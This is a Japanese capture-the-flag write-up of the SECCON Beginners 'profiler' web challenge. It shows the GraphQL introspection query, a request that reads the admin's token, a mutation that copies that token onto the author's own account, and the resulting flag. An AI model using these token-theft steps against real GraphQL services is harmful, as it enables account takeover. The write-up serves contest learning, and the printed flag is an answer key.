# profiler

とりあえず適当なアカウントを作ってログイン ( `'` をいたるところに入れてみたけれど特に問題なさそうなことを確認)。アカウントを作ったときに token が表示される。

与えられた token を正しく入力すると profile を更新できるので、最初は SQLi やテンプレートインジェクションを疑い、 `'` や `{{ config }}` などを profile に入れてみたが、何も表示されず…

chrome の inspector で Network を見てみると、 たびたび `/api` とやり取りをしていることに気づく。request payload は `{"query":"query {\n    me {\n      uid\n      name\n      profile\n    }\n  }"}` や `{"query":"mutation {\n    updateProfile(profile: \"\", token: \"0c3189c248e4fadfedbc3d7e53dd41593ba696837ee07aba8724e77bb51a8748\")\n  }"}`など。
なんだろうと思って出てくる単語を調べてみると、GraphQL だということがわかる。どうやら https://github.com/prisma-labs/get-graphql-schema を使えば schema を見ることができるらしい。

`$ get-graphql-schema https://profiler.quals.beginners.seccon.jp/api` を実行すると、以下の schema が確認できた。

```
type Mutation {
  updateProfile(profile: String!, token: String!): Boolean!
  updateToken(token: String!): Boolean!
}

type Query {
  me: User!
  someone(uid: ID!): User
  flag: String!
}

type User {
  uid: ID!
  name: String!
  profile: String!
  token: String!
}
```

名前を見た感じ、 `Mutation` の `updateToken` と、 `Query` の `someone` が有用そうに見え、 admin の token を Query で見て、 updateToken で自分の token を更新すれば flag が覗けるのでは、と予想した。

cookie はログインしたときのものを使い、 `https://profiler.quals.beginners.seccon.jp/api` に対して以下の post をした。

* `{"query":"query {\n    someone(uid: \"admin\") {\n      uid\n      name\n      profile\n    token\n    }\n  }"}` 

  * ```
    {
    "data": {
    "someone": {
    "name": "admin",
    "profile": "Hello, I'm admin.",
    "token": "743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b",
    "uid": "admin"
    }
    }
    }
    ```

* `{"query":"mutation {\n    updateToken(token: \"743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b\")\n  }"}` を post

その後、ログイン後の画面で Get FLAG を押すと、 flag が表示された。

`ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}`